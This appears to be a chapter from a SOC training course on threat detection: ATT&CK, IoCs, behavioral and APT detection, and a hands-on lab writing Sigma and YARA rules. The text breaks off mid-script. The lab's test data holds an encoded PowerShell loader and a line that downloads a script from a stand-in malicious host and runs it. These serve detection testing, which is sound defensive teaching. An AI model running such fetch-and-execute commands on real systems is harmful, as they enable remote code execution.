# Chapter 3: Threat Detection and Analysis

## Overview

Effective threat detection and analysis are critical capabilities for any Security Operations Center. This chapter explores advanced methodologies and frameworks for identifying, analyzing, and understanding security threats. We'll examine how to leverage the MITRE ATT&CK framework, identify indicators of compromise, apply behavioral analysis techniques, and detect sophisticated threats like Advanced Persistent Threats (APTs).

## Attack Methodologies and Kill Chain

### The Cyber Kill Chain Model

1. **Lockheed Martin Cyber Kill Chain**
   - **Reconnaissance**: Attacker gathers information about the target
   - **Weaponization**: Attacker creates malicious payload
   - **Delivery**: Attacker transmits weapon to target
   - **Exploitation**: Weapon executes, exploiting vulnerability
   - **Installation**: Malware installs access point
   - **Command & Control (C2)**: Attacker establishes persistent control
   - **Actions on Objectives**: Attacker achieves goals

2. **Kill Chain Applications**
   - Mapping defensive controls to each stage
   - Identifying detection opportunities
   - Understanding attack progression
   - Breaking attack chains through controls
   - Measuring defensive coverage

3. **Limitations of the Kill Chain Model**
   - Linear progression assumption
   - Limited coverage of insider threats
   - Insufficient for complex, multi-stage attacks
   - Lacks detail for modern attack techniques
   - Primarily focused on malware-based attacks

### Unified Kill Chain

1. **Extended Kill Chain Model**
   - Combines multiple frameworks
   - 18 phases of attack
   - Covers initial access, network propagation, and action phases
   - Accommodates cyclical attack patterns
   - Addresses lateral movement in detail

2. **Key Phases**
   - **Initial Foothold**: Reconnaissance, weaponization, delivery, exploitation
   - **Network Propagation**: Privilege escalation, defense evasion, credential access, lateral movement
   - **Action on Objectives**: Collection, exfiltration, impact, objectives

3. **Detection Strategies Across Phases**
   - Early phase detection techniques
   - Mid-attack disruption opportunities
   - Late-stage containment approaches
   - Cross-phase correlation methods

### MITRE ATT&CK-Based Analysis

1. **ATT&CK Framework Overview**
   - Tactics (the "why" of an attack)
   - Techniques (the "how" of an attack)
   - Procedures (specific implementation details)
   - Sub-techniques (variations of techniques)
   - Mitigations and detections

2. **Tactical Analysis Using ATT&CK**
   - Mapping observed behavior to techniques
   - Identifying gaps in detection coverage
   - Predicting potential next steps in an attack
   - Prioritizing defensive measures
   - Communicating findings using common language

![Attack Kill Chain Models Comparison](/images/courses/soc/attack_kill_chain_comparison.png)

## MITRE ATT&CK Framework Implementation

### ATT&CK Framework Structure

1. **Enterprise Matrix Components**
   - **Tactics**: 14 tactical categories representing adversary goals
     - Initial Access, Execution, Persistence, Privilege Escalation
     - Defense Evasion, Credential Access, Discovery, Lateral Movement
     - Collection, Command and Control, Exfiltration, Impact
     - Reconnaissance, Resource Development
   
   - **Techniques**: Specific methods to achieve tactical goals
     - Over 200 techniques across all tactics
     - Further broken down into sub-techniques
     - Each with detailed documentation
   
   - **Groups**: Known threat actors and their TTPs
     - Mapped to techniques they commonly use
     - Historical campaign information
     - Associated software and tools
   
   - **Software**: Malware and tools used by threat actors
     - Capabilities and behaviors
     - Associated techniques
     - Detection opportunities

2. **ATT&CK for Cloud, Containers, and Mobile**
   - Cloud-specific techniques and tactics
   - Container-specific attack patterns
   - Mobile platform attack techniques
   - ICS/OT-specific matrices

### Implementing ATT&CK in SOC Operations

1. **Detection Engineering with ATT&CK**
   - Mapping existing detection rules to ATT&CK techniques
   - Identifying coverage gaps
   - Prioritizing new detection development
   - Testing detection effectiveness
   - Measuring detection coverage

2. **Threat Hunting with ATT&CK**
   - Developing hunting hypotheses based on techniques
   - Creating hunting playbooks aligned to ATT&CK
   - Documenting findings using ATT&CK references
   - Building hunting libraries by tactic
   - Tracking hunting coverage across the framework

3. **Incident Response with ATT&CK**
   - Categorizing incidents using ATT&CK tactics
   - Identifying potential related techniques
   - Predicting adversary's next moves
   - Developing containment strategies based on technique understanding
   - Documenting incidents with standardized ATT&CK references

4. **Threat Intelligence with ATT&CK**
   - Mapping threat actor behaviors to techniques
   - Creating adversary emulation plans
   - Comparing threat actor methodologies
   - Prioritizing intelligence based on relevant techniques
   - Communicating intelligence findings using common framework

### ATT&CK Implementation Strategies

1. **Phased Implementation Approach**
   - Start with high-priority tactics
   - Focus on techniques relevant to your environment
   - Begin with detection before prevention
   - Implement in stages based on risk
   - Measure and improve coverage over time

2. **ATT&CK-Based SOC Metrics**
   - Detection coverage by tactic
   - Mean time to detect by technique
   - False positive rates by detection type
   - Technique prevalence in incidents
   - Defensive improvement over time

3. **Common Implementation Challenges**
   - Overwhelming scope of the framework
   - Limited resources for comprehensive coverage
   - Technical limitations in detection capabilities
   - Keeping pace with framework updates
   - Balancing breadth vs. depth of coverage

4. **Tools and Resources for ATT&CK Implementation**
   - ATT&CK Navigator for visualization
   - MITRE CALDERA for adversary emulation
   - ATT&CK Workbench for customization
   - Commercial security tools with ATT&CK mapping
   - Open-source detection rules mapped to ATT&CK

![MITRE ATT&CK Implementation Process](/images/courses/soc/mitre_attack_implementation.png)

## Indicators of Compromise (IoCs)

### Types of Indicators

1. **Atomic Indicators**
   - **File Hashes**
     - MD5, SHA-1, SHA-256
     - SSDEEP (fuzzy hashing)
     - Imphash (import hash)
     - Section hashes
   
   - **Network Indicators**
     - IP addresses
     - Domain names
     - URLs
     - SSL/TLS certificates
     - WHOIS information
   
   - **Host-Based Indicators**
     - Registry keys and values
     - File paths and names
     - Scheduled tasks
     - Service names
     - Mutex names

2. **Computed Indicators**
   - YARA rules
   - Snort/Suricata signatures
   - SIGMA rules
   - Regular expressions
   - Composite conditions

3. **Behavioral Indicators**
   - Process relationship patterns
   - Network traffic patterns
   - Authentication patterns
   - Data access patterns
   - Command line parameters

### IoC Lifecycle Management

1. **Collection and Creation**
   - Internal incident findings
   - Threat intelligence feeds
   - Information sharing communities
   - Vendor advisories
   - Malware analysis

2. **Validation and Enrichment**
   - False positive assessment
   - Context addition
   - Confidence scoring
   - Related indicator grouping
   - Environmental relevance evaluation

3. **Implementation and Detection**
   - SIEM integration
   - EDR deployment
   - Network monitoring implementation
   - Retrospective hunting
   - Real-time alerting

4. **Maintenance and Retirement**
   - Periodic review
   - Expiration dating
   - False positive tracking
   - Effectiveness measurement
   - Archiving and historical reference

### IoC Sharing Standards

1. **STIX (Structured Threat Information eXpression)**
   - Structured language for cyber threat intelligence
   - Objects: indicators, threats, attacks, courses of action
   - Relationships between objects
   - Versioning and confidence marking
   - Machine-readable format

2. **TAXII (Trusted Automated eXchange of Intelligence Information)**
   - Transport mechanism for sharing threat intelligence
   - API specifications for intelligence exchange
   - Collection and channel concepts
   - Authentication and authorization
   - Push and pull capabilities

3. **OpenIOC**
   - XML-based framework for IoC sharing
   - Logical operators for complex indicators
   - Hierarchical indicator organization
   - Supports wide range of indicator types
   - Used in various security tools

4. **MISP (Malware Information Sharing Platform)**
   - Open-source threat sharing platform
   - Event and attribute structure
   - Tagging and categorization
   - Automatic correlation
   - Export to multiple formats

### IoC Effectiveness and Limitations

1. **Strengths of IoC-Based Detection**
   - Fast implementation
   - High precision for known threats
   - Easily shareable
   - Automatable at scale
   - Clear evidence for investigations

2. **Limitations and Challenges**
   - Easily changed by attackers
   - Limited effectiveness against new threats
   - High false positive potential
   - Requires constant updating
   - Context often missing

3. **Enhancing IoC Effectiveness**
   - Implement aging and confidence metrics
   - Combine multiple indicators for detection
   - Add context to raw indicators
   - Use IoCs as starting points for hunting
   - Layer with behavioral detection

![IoC Lifecycle Management](/images/courses/soc/ioc_lifecycle_management.png)

## Behavioral Analysis Techniques

### Fundamentals of Behavioral Analysis

1. **Behavioral Analysis Principles**
   - Focus on actions rather than artifacts
   - Establish baseline of normal behavior
   - Identify deviations from normal
   - Consider context and relationships
   - Look for patterns across events

2. **Advantages Over Signature-Based Detection**
   - Effective against zero-day threats
   - Resilient to minor attack variations
   - Harder for attackers to evade
   - Reduces dependency on IoC updates
   - Better detection of sophisticated threats

3. **Key Behavioral Analysis Domains**
   - User behavior analytics
   - Entity behavior analytics
   - Network traffic analysis
   - Process behavior monitoring
   - Data access pattern analysis

### User and Entity Behavior Analytics (UEBA)

1. **UEBA Fundamentals**
   - Establishing baseline user behaviors
   - Identifying anomalous activities
   - Risk scoring based on deviation
   - Contextual analysis of actions
   - Correlation across multiple data sources

2. **Common UEBA Use Cases**
   - Account compromise detection
   - Insider threat identification
   - Data exfiltration attempts
   - Privilege abuse detection
   - Access anomaly identification

3. **UEBA Implementation Approaches**
   - Statistical analysis methods
   - Machine learning algorithms
   - Peer group analysis
   - Time-series analysis
   - Rule-based anomaly detection

4. **UEBA Data Sources**
   - Authentication logs
   - Access control logs
   - VPN and remote access logs
   - Email and collaboration tool logs
   - Application usage logs
   - Physical access logs

### Network Behavior Analysis

1. **Network Behavioral Indicators**
   - Traffic volume anomalies
   - Unusual protocol usage
   - Abnormal connection patterns
   - Unexpected data flows
   - Unusual timing patterns
   - Geographic anomalies

2. **Network Analysis Techniques**
   - Flow analysis (NetFlow, IPFIX)
   - Protocol behavior monitoring
   - Encrypted traffic analysis
   - East-west traffic monitoring
   - Beaconing detection
   - DGA (Domain Generation Algorithm) detection

3. **Advanced Network Detection Methods**
   - JA3/JA3S fingerprinting for TLS
   - JARM for server TLS fingerprinting
   - DNS tunneling detection
   - Traffic shape analysis
   - Timing-based covert channel detection
   - Protocol anomaly detection

### Endpoint Behavior Analysis

1. **Process Behavior Monitoring**
   - Process lineage and relationships
   - Unusual process arguments
   - Unexpected child processes
   - Abnormal process timing
   - Resource usage patterns
   - Inter-process communications

2. **File System Activity Analysis**
   - Unusual file access patterns
   - Mass file operations
   - Suspicious file modifications
   - Temporary file usage
   - File type mismatches
   - Hidden file operations

3. **Memory Analysis Techniques**
   - Code injection detection
   - Hook identification
   - Unusual memory allocations
   - In-memory file detection
   - Rootkit identification techniques
   - Process hollowing detection

4. **Registry and Configuration Monitoring**
   - Boot persistence mechanisms
   - Unusual service configurations
   - Security setting modifications
   - Credential storage access
   - Auto-start entry modifications
   - COM object hijacking

### Implementing Behavioral Detection

1. **Data Collection Requirements**
   - High-fidelity data sources
   - Sufficient historical data for baselining
   - Comprehensive coverage across systems
   - Consistent metadata and context
   - Adequate retention periods

2. **Analysis Methodologies**
   - Supervised machine learning
   - Unsupervised anomaly detection
   - Rule-based behavioral analytics
   - Statistical deviation analysis
   - Clustering and classification techniques

3. **Tuning and Optimization**
   - Baseline adjustment periods
   - Threshold calibration
   - False positive reduction strategies
   - Contextual enrichment
   - Feedback loops for improvement

4. **Integration with SOC Workflow**
   - Alert prioritization based on behavior risk scores
   - Behavioral context for traditional alerts
   - Automated response to high-confidence detections
   - Behavioral playbooks for investigation
   - Threat hunting based on behavioral hypotheses

![Behavioral Analysis Framework](/images/courses/soc/behavioral_analysis_framework.png)

## Advanced Persistent Threat Detection

### APT Characteristics and Tactics

1. **Defining Characteristics of APTs**
   - Advanced tools and techniques
   - Persistent access and presence
   - Targeted objectives and victims
   - Well-resourced threat actors
   - Long-term campaign operations
   - Stealth and evasion focus

2. **Common APT Objectives**
   - Intellectual property theft
   - Strategic intelligence gathering
   - Critical infrastructure targeting
   - Financial system compromise
   - Supply chain infiltration
   - Destructive capabilities deployment

3. **APT Attack Lifecycle**
   - Initial compromise (often via spear-phishing)
   - Establishing persistence
   - Privilege escalation
   - Internal reconnaissance
   - Lateral movement
   - Data collection and staging
   - Exfiltration
   - Maintaining presence

### APT Detection Strategies

1. **Multi-layered Detection Approach**
   - Network-based detection
   - Endpoint-based detection
   - Log-based analytics
   - Threat intelligence integration
   - User behavior monitoring
   - Data-centric monitoring

2. **Early-Stage APT Detection**
   - Spear-phishing identification
   - Unusual application exploitation
   - Web shell detection
   - Initial backdoor communication
   - First-time-seen analysis
   - Unusual authentication events

3. **Mid-Stage APT Detection**
   - Credential theft detection
   - Privilege escalation monitoring
   - Internal reconnaissance identification
   - Unusual lateral movement
   - Administrative tool misuse
   - Scheduled task/service creation

4. **Late-Stage APT Detection**
   - Data staging identification
   - Compression of sensitive data
   - Unusual database access
   - Encrypted channel detection
   - Periodic beaconing
   - Data exfiltration attempts

### APT Hunting Techniques

1. **Hypothesis-Based Hunting**
   - Developing hunting hypotheses based on APT TTPs
   - Focusing on high-value assets and users
   - Searching for specific APT toolsets
   - Examining historical data for indicators
   - Testing assumptions about security controls

2. **Data Collection for APT Hunting**
   - Enhanced logging for critical systems
   - Network traffic capture and analysis
   - Process execution monitoring
   - Authentication logs with extended detail
   - PowerShell and command-line logging
   - Registry and file system change monitoring

3. **Advanced Hunting Queries**
   - Rare process execution patterns
   - Unusual service installations
   - Anomalous login time analysis
   - Suspicious registry modifications
   - Uncommon network connections
   - Living-off-the-land binary usage

4. **APT Hunt Case Studies**
   - Example: Hunting for HAFNIUM Exchange server exploitation
   - Example: Detecting SUNBURST supply chain compromise
   - Example: Identifying Cobalt Strike beacons
   - Example: Hunting for NOBELIUM infrastructure

### APT Attribution and Intelligence

1. **Attribution Factors**
   - Tool usage and malware similarities
   - Infrastructure overlap
   - Targeting patterns
   - Operational timing
   - Language and cultural indicators
   - Strategic objectives alignment

2. **Major APT Groups and Tactics**
   - Nation-state sponsored groups
   - Financially motivated APT actors
   - Hacktivists with advanced capabilities
   - Mercenary APT groups
   - Regional focus and specializations

3. **Intelligence Sources for APT Detection**
   - Government advisories
   - Security vendor research
   - Information sharing communities
   - Open-source intelligence
   - Internal incident findings
   - Threat intelligence platforms

4. **Challenges in APT Detection**
   - Living-off-the-land techniques
   - Fileless malware
   - Supply chain compromises
   - Zero-day exploitation
   - Counter-forensic techniques
   - Legitimate tool abuse

![APT Detection Framework](/images/courses/soc/apt_detection_framework.png)

## Network Traffic Analysis for Threat Detection

### Network Monitoring Fundamentals

1. **Network Visibility Requirements**
   - North-south (perimeter) traffic
   - East-west (lateral) traffic
   - Encrypted traffic considerations
   - Cloud network visibility
   - Remote user traffic
   - IoT and OT network segments

2. **Network Data Collection Methods**
   - SPAN/mirror ports
   - Network taps
   - Virtual taps for cloud/virtual environments
   - NetFlow/IPFIX collection
   - Packet brokers and aggregators
   - Agent-based network monitoring

3. **Network Data Types**
   - Full packet capture (PCAP)
   - Flow data (NetFlow, sFlow, IPFIX)
   - Session metadata
   - Protocol metadata extraction
   - DNS query logs
   - HTTP/TLS proxy logs

### Traffic Analysis Techniques

1. **Flow Analysis**
   - Connection metadata examination
   - Traffic volume baseline deviation
   - Unusual port and protocol usage
   - Connection duration anomalies
   - Periodic communication patterns
   - Data volume discrepancies

2. **Protocol Analysis**
   - Protocol compliance verification
   - Command sequence analysis
   - Parameter and field inspection
   - Protocol tunneling detection
   - Unusual protocol behavior identification
   - Protocol-specific anomalies

3. **Encrypted Traffic Analysis**
   - TLS handshake analysis
   - Certificate validation
   - JA3/JA3S fingerprinting
   - JARM server fingerprinting
   - Encrypted traffic timing analysis
   - Encrypted traffic size analysis

4. **DNS Traffic Analysis**
   - Query pattern analysis
   - Domain generation algorithm detection
   - DNS tunneling identification
   - Fast flux detection
   - Domain reputation checking
   - Unusual DNS record types

### Common Network-Based Threats

1. **Command and Control (C2) Communication**
   - Beaconing detection
   - Unusual connection destinations
   - Irregular timing patterns
   - Domain/IP reputation analysis
   - Protocol anomalies
   - Encrypted channel detection

2. **Lateral Movement**
   - Unusual internal connection patterns
   - Administrative protocol misuse
   - Authentication traffic spikes
   - Remote service exploitation
   - Unusual port usage on internal networks
   - Excessive SMB/RDP/WMI traffic

3. **Data Exfiltration**
   - Large outbound data transfers
   - Unusual upload patterns
   - Unexpected protocols for data transfer
   - Compressed or encrypted outbound data
   - Abnormal access times or volumes
   - Unusual destination for sensitive data

4. **Network Scanning and Reconnaissance**
   - Port scanning detection
   - Host enumeration attempts
   - Service discovery patterns
   - Network mapping activities
   - Vulnerability scanning signatures
   - Unusual broadcast/multicast traffic

### Network Detection Tools and Techniques

1. **Network Intrusion Detection Systems (NIDS)**
   - Signature-based detection
   - Protocol anomaly detection
   - Statistical anomaly detection
   - Heuristic analysis
   - Machine learning integration
   - Rule management and tuning

2. **Network Traffic Analysis (NTA) Platforms**
   - Behavioral analytics for network traffic
   - Entity modeling and profiling
   - Risk scoring algorithms
   - Historical baseline comparison
   - Automated threat detection
   - Network forensics capabilities

3. **Open Source Network Security Tools**
   - Zeek (formerly Bro) for network monitoring
   - Suricata for intrusion detection
   - Moloch for full packet capture
   - NetworkMiner for network forensics
   - Wireshark for packet analysis
   - ntopng for traffic visualization

4. **Advanced Network Forensics**
   - Session reconstruction
   - Conversation analysis
   - File extraction from network traffic
   - Timeline creation
   - Attribution evidence gathering
   - Malware communication analysis

![Network Traffic Analysis Process](/images/courses/soc/network_traffic_analysis.png)

## Hands-on Lab: Threat Detection and Analysis

### Lab Objectives
In this hands-on lab, you will:
1. Implement MITRE ATT&CK-based detection rules
2. Create and utilize Indicators of Compromise
3. Apply behavioral analysis techniques
4. Detect simulated APT activities
5. Analyze network traffic for threat indicators

### Lab Requirements
- Virtual machine with at least 8GB RAM and 4 CPU cores
- Ubuntu Server 20.04 LTS or later
- Internet connectivity for downloading tools
- Basic Linux command line knowledge

### Step 1: Setting Up the Environment

1. **Create a virtual machine and install dependencies**
   ```bash
   # Update system packages
   sudo apt update
   sudo apt upgrade -y
   
   # Install required dependencies
   sudo apt install -y curl wget git python3-pip net-tools tcpdump tshark unzip
   
   # Install Python packages
   pip3 install pandas numpy matplotlib jupyter yara-python
   ```

2. **Create a project directory**
   ```bash
   mkdir -p ~/threat-detection-lab
   cd ~/threat-detection-lab
   ```

3. **Clone necessary repositories**
   ```bash
   # Clone Sigma rules repository
   git clone https://github.com/SigmaHQ/sigma.git
   
   # Clone YARA rules repository
   git clone https://github.com/Yara-Rules/rules.git yara-rules
   
   # Download MITRE ATT&CK Navigator
   git clone https://github.com/mitre-attack/attack-navigator.git
   ```

### Step 2: Implementing ATT&CK-Based Detection

1. **Create a mapping file for techniques to monitor**
   ```bash
   cat > attack_mapping.json << 'EOF'
   {
     "techniques": [
       {
         "technique_id": "T1059.001",
         "technique_name": "Command and Scripting Interpreter: PowerShell",
         "data_sources": ["process_creation", "powershell_logs", "command_line"],
         "detection_rules": [
           "PowerShell with encoded commands",
           "PowerShell downloading content from Internet",
           "PowerShell execution policy bypass",
           "PowerShell with hidden window"
         ]
       },
       {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "data_sources": ["file_event", "process_creation", "windows_event_logs"],
         "detection_rules": [
           "Scheduled task creation with suspicious actions",
           "Scheduled task creation by unusual process",
           "Modification of existing scheduled tasks"
         ]
       },
       {
         "technique_id": "T1078.002",
         "technique_name": "Valid Accounts: Domain Accounts",
         "data_sources": ["authentication_logs", "account_manipulation"],
         "detection_rules": [
           "Authentication from unusual source",
           "Authentication at unusual time",
           "Multiple failed authentication attempts",
           "Authentication to dormant accounts"
         ]
       }
     ]
   }
   EOF
   ```

2. **Create Sigma rules for ATT&CK techniques**
   ```bash
   mkdir -p sigma_rules
   
   # PowerShell encoded command rule
   cat > sigma_rules/powershell_encoded_command.yml << 'EOF'
   title: PowerShell Encoded Command
   id: 69e6c0f7-0af0-4775-8820-8c2b723456d9
   status: experimental
   description: Detects PowerShell execution with encoded commands
   references:
     - https://attack.mitre.org/techniques/T1059/001/
   author: SOC Course
   date: 2023/01/15
   tags:
     - attack.execution
     - attack.t1059.001
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       CommandLine|contains:
         - " -e "
         - " -en "
         - " -enc "
         - " -EncodedCommand "
     condition: selection
   falsepositives:
     - Legitimate administrative use of encoded commands
   level: medium
   EOF
   
   # Scheduled task creation rule
   cat > sigma_rules/suspicious_scheduled_task.yml << 'EOF'
   title: Suspicious Scheduled Task Creation
   id: 92a4faff-9455-4922-b738-a8f48f5d7c0c
   status: experimental
   description: Detects scheduled task creation with suspicious actions
   references:
     - https://attack.mitre.org/techniques/T1053/005/
   author: SOC Course
   date: 2023/01/15
   tags:
     - attack.persistence
     - attack.t1053.005
   logsource:
     product: windows
     service: taskscheduler
   detection:
     selection:
       EventID: 4698
     suspicious_actions:
       TaskContent|contains:
         - "powershell.exe -e"
         - "cmd.exe /c"
         - "regsvr32"
         - "rundll32"
         - "wscript"
     condition: selection and suspicious_actions
   falsepositives:
     - Administrative task scheduling
   level: medium
   EOF
   
   # Unusual authentication rule
   cat > sigma_rules/unusual_authentication_time.yml << 'EOF'
   title: Authentication at Unusual Time
   id: 5a2683e1-734b-4a54-9d5f-9e9d2c683db6
   status: experimental
   description: Detects authentication events occurring outside normal working hours
   references:
     - https://attack.mitre.org/techniques/T1078/002/
   author: SOC Course
   date: 2023/01/15
   tags:
     - attack.initial_access
     - attack.t1078.002
   logsource:
     product: windows
     service: security
   detection:
     selection:
       EventID: 4624
       LogonType: 10
     timeframe:
       - after: 20:00
       - before: 06:00
     condition: selection and timeframe
   falsepositives:
     - Legitimate after-hours work
     - Authorized maintenance windows
   level: medium
   EOF
   ```

3. **Create a Python script to simulate rule matching**
   ```bash
   cat > simulate_detection.py << 'EOF'
   #!/usr/bin/env python3
   import json
   import yaml
   import re
   import os
   import sys
   from datetime import datetime
   
   def load_sigma_rules(directory):
       rules = []
       for filename in os.listdir(directory):
           if filename.endswith('.yml'):
               with open(os.path.join(directory, filename), 'r') as file:
                   rule = yaml.safe_load(file)
                   rules.append(rule)
       return rules
   
   def load_attack_mapping(filename):
       with open(filename, 'r') as file:
           return json.load(file)
   
   def simulate_event(event_type, event_data):
       print(f"\n[+] Simulating event: {event_type}")
       print(f"    Data: {json.dumps(event_data, indent=2)}")
       
       matched_rules = []
       for rule in sigma_rules:
           # Simple simulation of rule matching
           if 'detection' in rule:
               detection = rule['detection']
               if 'selection' in detection:
                   selection = detection['selection']
                   match = True
                   
                   # Check if event type matches logsource
                   if 'logsource' in rule:
                       logsource = rule['logsource']
                       if 'category' in logsource and logsource['category'] != event_data.get('category'):
                           match = False
                       if 'service' in logsource and logsource['service'] != event_data.get('service'):
                           match = False
                   
                   # Check selection criteria
                   for key, value in selection.items():
                       if '|contains' in key:
                           field = key.split('|')[0]
                           if field in event_data:
                               field_value = event_data[field]
                               if isinstance(value, list):
                                   found = False
                                   for v in value:
                                       if v in field_value:
                                           found = True
                                           break
                                   if not found:
                                       match = False
                               else:
                                   if value not in field_value:
                                       match = False
                       else:
                           if key in event_data:
                               if event_data[key] != value:
                                   match = False
                           else:
                               match = False
                   
                   if match:
                       matched_rules.append(rule)
       
       if matched_rules:
           print("\n[!] Matched rules:")
           for rule in matched_rules:
               print(f"    - {rule['title']} (Level: {rule['level']})")
               print(f"      Description: {rule['description']}")
               if 'tags' in rule:
                   attack_techniques = [tag for tag in rule['tags'] if tag.startswith('attack.t')]
                   if attack_techniques:
                       print(f"      ATT&CK Techniques: {', '.join(attack_techniques)}")
       else:
           print("\n[-] No rules matched this event")
   
   if __name__ == "__main__":
       # Load rules and mappings
       sigma_rules = load_sigma_rules('sigma_rules')
       attack_mapping = load_attack_mapping('attack_mapping.json')
       
       # Simulate PowerShell encoded command
       simulate_event("process_creation", {
           "category": "process_creation",
           "CommandLine": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABhADIALwBiAE4AaABSAEcALwBTAGcAVQBWAEIAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA",
           "ProcessId": 1234,
           "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
           "ParentImage": "C:\\Windows\\System32\\cmd.exe"
       })
       
       # Simulate scheduled task creation
       simulate_event("taskscheduler", {
           "service": "taskscheduler",
           "EventID": 4698,
           "TaskName": "SuspiciousTask",
           "TaskContent": "<Actions><Exec><Command>cmd.exe</Command><Arguments>/c powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=</Arguments></Exec></Actions>",
           "SubjectUserName": "user1"
       })
       
       # Simulate unusual authentication time
       current_hour = datetime.now().hour
       simulate_event("security", {
           "service": "security",
           "EventID": 4624,
           "LogonType": 10,
           "TargetUserName": "admin",
           "IpAddress": "192.168.1.100",
           "WorkstationName": "WORKSTATION01",
           "LogonTime": "22:30:00"  # Simulating evening login
       })
   EOF
   
   chmod +x simulate_detection.py
   ```

4. **Run the simulation**
   ```bash
   python3 simulate_detection.py
   ```

### Step 3: Working with Indicators of Compromise (IoCs)

1. **Create a YARA rule for detecting malicious patterns**
   ```bash
   mkdir -p yara_rules
   
   cat > yara_rules/suspicious_powershell.yar << 'EOF'
   rule Suspicious_PowerShell_Execution
   {
       meta:
           description = "Detects suspicious PowerShell execution patterns"
           author = "SOC Course"
           reference = "https://attack.mitre.org/techniques/T1059/001/"
           date = "2023-01-15"
           attack_technique = "T1059.001"
       
       strings:
           $s1 = "FromBase64String" nocase
           $s2 = "Invoke-Expression" nocase
           $s3 = "IEX" nocase
           $s4 = "Net.WebClient" nocase
           $s5 = "DownloadString" nocase
           $s6 = "DownloadFile" nocase
           $s7 = "hidden" nocase
           $s8 = "-enc" nocase
           $s9 = "-encodedcommand" nocase
           $s10 = "bypass" nocase
           $s11 = "-nop" nocase
           $s12 = "-windowstyle hidden" nocase
           
       condition:
           (uint16(0) == 0x5A4D or uint32(0) == 0x4D5A9000) and 3 of them or
           4 of them
   }
   
   rule Suspicious_Scheduled_Task
   {
       meta:
           description = "Detects suspicious scheduled task creation"
           author = "SOC Course"
           reference = "https://attack.mitre.org/techniques/T1053/005/"
           date = "2023-01-15"
           attack_technique = "T1053.005"
       
       strings:
           $s1 = "schtasks" nocase
           $s2 = "/create" nocase
           $s3 = "/sc" nocase
           $s4 = "powershell" nocase
           $s5 = "cmd.exe" nocase
           $s6 = "/c" nocase
           $s7 = "-enc" nocase
           $s8 = "hidden" nocase
           
       condition:
           ($s1 and $s2) and 3 of them
   }
   EOF
   ```

2. **Create a script to test YARA rules**
   ```bash
   cat > test_yara.py << 'EOF'
   #!/usr/bin/env python3
   import yara
   import sys
   import os
   
   def test_yara_rule(rule_path, test_file):
       try:
           rules = yara.compile(rule_path)
           with open(test_file, 'wb') as f:
               f.write(test_data)
           
           matches = rules.match(test_file)
           if matches:
               print(f"[+] YARA rule matched: {matches}")
               for match in matches:
                   print(f"    Rule: {match.rule}")
                   print(f"    Tags: {match.tags}")
                   print(f"    Meta: {match.meta}")
                   print(f"    Strings:")
                   for string in match.strings:
                       print(f"      - {string[1]}: {string[2].decode('utf-8', errors='replace')}")
           else:
               print("[-] No YARA rule matches found")
       except Exception as e:
           print(f"[!] Error: {e}")
   
   # Test data for PowerShell IoC
   test_data = b'''
   MZ...
   powershell.exe -nop -windowstyle hidden -ExecutionPolicy bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABhADIALwBiAE4AaABSAEcALwBTAGcAVQBWAEIAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA
   $client = New-Object System.Net.WebClient
   $client.DownloadString('http://malicious.example.com/payload.ps1') | IEX
   Invoke-Expression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand)))
   '''
   
   if __name__ == "__main__":
       test_file = "test_sample.bin"
       test_yara_rule("yara_rules/suspicious_powershell.yar", test_file)
       
       # Clean up
       if os.path.exists(test_file):
           os.remove(test_file)
   EOF
   
   chmod +x test_yara.py
   ```

3. **Run the YARA test**
   ```bash
   python3 test_yara.py
   ```

### Step 4: Behavioral Analysis Implementation

1. **Create a script to analyze process behavior**
   ```bash
   cat > behavioral_analysis.py << 'EOF'
   #!/usr/bin/env python3
   import json
   import datetime
   import matplotlib.pyplot as plt
   import numpy as np
   from collections import defaultdict
   
   # Simulated process execution data
   process_data = [
       {"timestamp": "2023-01-15T08:01:23", "process": "explorer.exe", "parent": "userinit.exe", "user": "user1", "command_line": "C:\\Windows\\explorer.exe"},
       {"timestamp": "2023-01-15T08:02:45", "process": "chrome.exe", "parent": "explorer.exe", "user": "user1", "command_line": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
